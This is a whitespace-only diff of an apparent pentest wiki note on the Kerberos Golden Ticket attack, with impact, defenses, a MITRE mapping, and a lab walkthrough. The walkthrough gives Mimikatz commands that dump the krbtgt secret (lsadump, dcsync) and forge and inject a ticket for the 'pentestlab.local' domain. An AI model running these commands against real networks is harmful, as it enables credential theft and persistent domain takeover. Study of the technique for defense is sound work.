@@ -46,11 +46,15 @@ From a technical perspective, the attack involves extracting the TGT from memory
 
 From a business perspective, a Golden Ticket attack can be devastating. An attacker with a Golden Ticket can bypass all authentication mechanisms and access any resource in the domain. This can lead to data theft, data destruction, and disruption of business operations.
 
+ 
+
 ## Requirements
 
 1. Access to a Windows domain
 
 1. Mimikatz tool
+
+ 
 
 ## Defense
 
@@ -60,6 +64,8 @@ From a business perspective, a Golden Ticket attack can be devastating. An attac
 
 1. Implement least privilege access controls
 
+ 
+
 ## Objectives
 
 1. Gain persistent access to a Windows domain
@@ -67,6 +73,8 @@ From a business perspective, a Golden Ticket attack can be devastating. An attac
 1. Move laterally within the network
 
 1. Escalate privileges
+
+ 
 
 # Instructions
 
@@ -86,8 +94,14 @@ kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-20
 
 This will create a Golden Ticket for the user 'evil' with administrative privileges on the 'pentestlab.local' domain.
 
+ 
+
+
+
 **Code**: [[# Get info - Mimikatz
 lsadump::lsa /inject /name:k]]
+
+
 
 > The commands used in this attack are:
 
@@ -103,11 +117,17 @@ lsadump::lsa /inject /name:k]]
 
 6. kerberos::golden - This command forges a Golden Ticket using the extracted krbtgt account information and grants administrative privileges to the specified user on the specified domain.
 
+
+
 **Command** ([[Get info - Mimikatz]]):
 
 ```bash
 lsadump::lsa /inject /name:krbtgt
 ```
+
+
+
+
 
 **Command** ([[lsadump::lsa /patch]]):
 
@@ -115,11 +135,19 @@ lsadump::lsa /inject /name:krbtgt
 lsadump::lsa /patch
 ```
 
+
+
+
+
 **Command** ([[lsadump::trust /patch]]):
 
 ```bash
 lsadump::trust /patch
 ```
+
+
+
+
 
 **Command** ([[lsadump::dcsync /user:krbtgt]]):
 
@@ -127,11 +155,19 @@ lsadump::trust /patch
 lsadump::dcsync /user:krbtgt
 ```
 
+
+
+
+
 **Command** ([[Forge a Golden ticket - Mimikatz]]):
 
 ```bash
 kerberos::purge
 ```
+
+
+
+
 
 **Command** ([[kerberos::golden /user:evil /domain:pentestlab.loc]]):
 
@@ -139,11 +175,17 @@ kerberos::purge
 kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
 ```
 
+
+
+
+
 **Command** ([[kerberos::tgt]]):
 
 ```bash
 kerberos::tgt
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -178,3 +220,5 @@ kerberos::tgt
 - [[Kerberos Tickets]]
 - [[Pass-the-Ticket Golden Tickets]]
 - [[Using Mimikatz]]
+
+
